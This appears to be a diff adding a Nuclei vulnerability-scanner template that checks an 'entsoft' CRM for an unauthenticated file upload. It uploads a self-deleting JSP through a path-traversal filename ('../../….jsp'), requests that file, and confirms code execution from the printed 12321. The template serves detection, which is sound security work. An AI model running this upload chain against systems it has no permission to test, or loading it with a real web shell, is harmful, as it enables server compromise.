@@ -1,0 +1,51 @@
+id: zhedaente-entsoft-fileupload-CrmBasicAction
+
+info:
+  name: zhedaente-entsoft-fileupload-CrmBasicAction
+  author: msk
+  severity: critical
+
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+
+http:
+  - raw:
+      - |
+        POST /entsoft/CrmBasicAction.entcrm?method=zipFileUpload&c_transModel=old HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2657.7 Safari/537.36
+        Connection: close
+        Content-Type: multipart/form-data; boundary={{boundary}}
+        Accept-Encoding: gzip
+        
+        --{{boundary}}
+        Content-Disposition: form-data; name="file"; filename="../../{{filename}}.jsp"
+        Content-Type: application/zip
+        
+        <% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        --{{boundary}}--
+
+      - |+
+        GET /enterdoc/dao{{filepath}}{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2657.7 Safari/537.36
+        Content-Length: 0
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+    extractors:
+      - type: regex
+        name: filepath
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - '(/\d+/)'
+
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200 && contains(body_2,'12321')"
